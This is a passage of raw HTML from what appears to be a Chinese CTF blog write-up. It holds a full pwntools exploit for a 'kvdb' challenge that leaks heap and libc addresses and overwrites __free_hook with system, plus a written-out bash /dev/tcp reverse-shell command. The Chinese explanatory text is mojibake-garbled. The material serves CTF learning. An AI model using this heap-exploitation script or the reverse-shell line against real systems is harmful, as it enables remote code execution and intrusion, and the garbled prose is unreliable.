class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="number">9998</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=remote(ip,port)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>,</span><br><span class="line">    <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,</span><br><span class="line">    <span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,</span><br><span class="line">    <span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,</span><br><span class="line">    <span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,</span><br><span class="line">    <span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,</span><br><span class="line">    <span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHUT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_int</span>(<span class="params">digit</span>):</span></span><br><span class="line">    pay=p16(<span class="number">0x0100</span>)+p64(digit)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=<span class="built_in">bytes</span>(str_srt.ljust(str_len,<span class="string">&#x27;\x00&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string1</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=str_srt</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span>(<span class="params">code,context</span>):</span></span><br><span class="line">    pay=<span class="string">b&#x27;KVDB&#x27;</span>+p16(<span class="number">0x0300</span>)+op_buf[code]</span><br><span class="line">    <span class="keyword">if</span>(context!=<span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">        pay+=context</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_int_string</span>(<span class="params">key_value,value_len,content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string(value_len,content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">7</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">8</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_string_string</span>(<span class="params">key_len,key_content,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    pay+=build_string(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_string_key</span>(<span class="params">key_len,key_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stringkey_get_value</span>(<span class="params">key_len,key_value</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intkey_get_value</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_int_key</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_value</span>(<span class="params">key_value,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string1(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span>(<span class="params">key_len,key_content,new_len,new_content</span>):</span></span><br><span class="line">    pay=build_string1(key_len,key_content)</span><br><span class="line">    pay+=build_string1(new_len,new_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">4</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#add_int_string</span></span><br><span class="line">    payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">    <span class="comment">#dump</span></span><br><span class="line">    payload+=dump()</span><br><span class="line">    <span class="comment">#add_string_string</span></span><br><span class="line">    payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    payload+=del_int_key(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0x70</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recv(<span class="number">710</span>)</span><br><span class="line">    heap_base=u64(sh.recvuntil(<span class="string">&#x27;V&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x128e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    <span class="comment">#add</span></span><br><span class="line">    payload=add_int_string(<span class="number">0xd0</span>,<span class="number">0x500</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    <span class="comment">#change_value</span></span><br><span class="line">    heap_addr=heap_base+<span class="number">0x12a60</span></span><br><span class="line">    payload+=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x16</span>)+p32(heap_addr&amp;<span class="number">0xffffffff</span>)+p16((heap_addr&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0xc0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">0x20</span></span><br><span class="line">    pay1=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    payload+=change_value(<span class="number">0xc0</span>,<span class="number">0x30</span>,pay1)</span><br><span class="line">    payload+=change_value(<span class="number">0xa0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    pay=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=change_key(<span class="number">0x30</span>,pay1,<span class="number">0x30</span>,pay)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>åå¼¹åŸç†</p>
<p>ç±»ä¼¼bashçš„åå¼¹åŸç†ï¼Œbashçš„åå¼¹å‘½ä»¤æ˜¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base -i &amp;&gt; /dev/tcp/ip/port  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>base i</code>çš„ä½œç”¨æ˜¯äº§ç”Ÿä¸€ä¸ªbaseäº¤äº’ç¯å¢ƒï¼Œç„¶å<code>&amp;&gt;</code>ä»£è¡¨ç€æŠŠå‰é¢baseçš„äº¤äº’ç¯å¢ƒçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šä½åˆ°åé¢çš„æ–‡ä»¶ä¸­ï¼Œç„¶ååé¢<code>0&gt;&amp;1</code>å°±æ˜¯æŠŠæ ‡å‡†è¾“å…¥é‡å®šä½åˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œç”±äºæ ‡å‡†è¾“å‡ºæŒ‡å‘tcpè¿æ¥ï¼Œæ‰€ä»¥æ ‡å‡†è¾“å…¥ä¹Ÿé‡å®šä½åˆ°è¿™ä¸ªæ–‡ä»¶ä¸Šäº†ï¼Œè¿™æ ·å°±äº§ç”Ÿä¸€ä¸ªäº¤äº’å¼çš„baseäº†ã€‚</p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>&gt;&amp;</code>ç¬¦å·ï¼Œä»–ä¼šæŠŠå‰é¢çš„å†…å®¹é‡å®šå‘åˆ°åé¢çš„å†…å®¹ï¼Œåé¢æ˜¯ä¸ªfd,æ¯”å¦‚<code>echo flag &gt;&amp;1</code>å°±æ˜¯æŠŠflagé‡å®šå‘åˆ°äº†åˆ°äº†1å³æ ‡å‡†è¾“å‡ºï¼Œåœ¨è„šæœ¬ä¸­æˆ‘æ˜¯<code>cat flag &gt;&amp;4</code>å°±æ˜¯æŠŠflagæ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°äº†4å³scocketè¿æ¥ä¸Šã€‚æ‰€ä»¥ä¼šæŠŠflagå‘è¿‡æ¥ã€‚</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/27/TSCTF/" rel="prev" title="TSCTF">
      <i class="fa fa-chevron-left"></i> TSCTF
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/05/27/Dest0g3-pwn/" rel="next" title="Dest0g3-pwn">
      Dest0g3-pwn <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-shellcode"><span class="nav-number">2.</span> <span class="nav-text">pwn2 shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn3-easy-http"><span class="nav-number">3.</span> <span class="nav-text">pwn3 easy_http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4-kvdb"><span class="nav-number">4.</span> <span class="nav-text">pwn4 kvdb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E5%85%B3%E7%B3%BB"><span class="nav-number">4.1.</span> <span class="nav-text">0x1 ç»“æ„ä½“åŠå…³ç³»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E5%A4%A7%E8%87%B4%E9%80%BB%E8%BE%91"><span class="nav-number">4.2.</span> <span class="nav-text">0x2 å¤§è‡´é€»è¾‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.3.</span> <span class="nav-text">0x3 æ¼æ´</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.4.</span> <span class="nav-text">0x4 æ¼æ´åˆ©ç”¨</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">34</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
